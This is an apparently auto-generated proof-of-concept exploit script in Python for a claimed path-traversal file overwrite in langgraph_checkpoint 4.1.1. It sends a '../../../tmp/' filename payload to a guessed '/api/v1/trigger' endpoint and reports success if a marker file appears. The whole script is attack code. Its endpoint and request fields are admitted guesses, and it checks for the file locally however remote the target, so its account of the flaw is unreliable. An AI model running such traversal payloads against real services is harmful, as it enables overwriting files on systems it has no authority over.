#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint_latest/langgraph_checkpoint-4.1.1)
# Path: afo-000
# Sink: sync
# Auto-generated — run with: python3 afo_code_does_sanitize_traversal_sync.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1
Vulnerability: Arbitrary File Overwrite (AFO) via path traversal

The library's sync() method writes internal data to a file path constructed from
self.filename, which is set during __init__(). If an attacker can control the
filename parameter (e.g., via a namespace or key in the store), they can use
path traversal sequences like '../' to write to arbitrary locations on the
filesystem.

This PoC demonstrates the vulnerability by writing a benign marker file to
/tmp/poc_success.txt to prove arbitrary file write capability.

Usage:
    python3 poc.py [--target http://localhost:8000] [--payload "benign content"]
"""

import argparse
import sys
import os
import tempfile
import json
import requests
from typing import Optional

# Default target - adjust as needed
DEFAULT_TARGET = "http://localhost:8000"
# Benign payload to demonstrate file write
DEFAULT_PAYLOAD = "poc_success"

def exploit(target_url: str, payload: str = DEFAULT_PAYLOAD) -> bool:
    """
    Attempt to exploit the arbitrary file overwrite vulnerability.
    
    The attack works by:
    1. Sending a request with a crafted filename containing path traversal
    2. The filename is used directly in open() without sanitization
    3. The internal data (which we can influence) is written to the target path
    
    Args:
        target_url: Base URL of the vulnerable service
        payload: Content to write to the target file
    
    Returns:
        True if exploitation appears successful, False otherwise
    """
    # The target file path - using /tmp for safe demonstration
    target_file = "/tmp/poc_success.txt"
    
    # Craft the malicious filename with path traversal
    # We need to traverse from wherever the app stores files to /tmp
    # Assuming the app stores files in a subdirectory, we use multiple ../ sequences
    malicious_filename = f"../../../tmp/poc_success.txt"
    
    # The vulnerable endpoint - adjust based on actual API
    # This simulates the trigger endpoint described in the finding
    endpoint = f"{target_url}/api/v1/trigger"
    
    # Craft the request payload
    # The exact structure depends on how the library is used, but typically:
    # - The filename is passed as a parameter
    # - The content is derived from internal data structures we can influence
    request_data = {
        "filename": malicious_filename,
        "content": payload,
        "namespace": ["test"],
        "key": "poc_key"
    }
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to write to: {target_file}")
    print(f"[*] Using malicious filename: {malicious_filename}")
    print(f"[*] Payload: {payload}")
    
    try:
        # Send the exploit request
        response = requests.post(
            endpoint,
            json=request_data,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
        
        # Check if the file was created
        if os.path.exists(target_file):
            with open(target_file, 'r') as f:
                written_content = f.read().strip()
            print(f"[+] SUCCESS! File {target_file} was created")
            print(f"[+] Written content: {written_content}")
            
            # Clean up the marker file
            os.remove(target_file)
            print(f"[+] Cleaned up marker file")
            return True
        else:
            print(f"[-] File {target_file} was not created")
            print("[*] The exploit may have failed or the file path is different")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[*] Make sure the target service is running")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_checkpoint-4.1.1 Arbitrary File Overwrite"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD,
        help="Content to write to the target file (default: poc_success)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("langgraph_checkpoint-4.1.1 Arbitrary File Overwrite PoC")
    print("=" * 60)
    print()
    
    success = exploit(args.target, args.payload)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] The vulnerability is confirmed - arbitrary file write is possible")
        print("[!] WARNING: This demonstrates a serious security issue")
        print("[!] An attacker could overwrite critical system files")
    else:
        print("\n[-] Exploit did not succeed")
        print("[*] Possible reasons:")
        print("  - The target service is not running")
        print("  - The API endpoint is different")
        print("  - The filename parameter is sanitized in this version")
        print("  - The data structure for the request is different")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
